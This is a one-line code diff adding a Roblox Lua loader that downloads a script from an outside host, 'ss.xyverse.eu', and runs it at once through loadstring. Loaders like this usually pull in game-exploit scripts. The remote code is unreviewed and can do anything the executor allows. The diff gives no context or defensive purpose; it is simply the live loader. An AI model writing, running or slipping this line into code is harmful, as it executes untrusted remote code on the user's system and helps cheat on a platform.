@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ss.xyverse.eu/SilentScriptOnTop.lua"))()
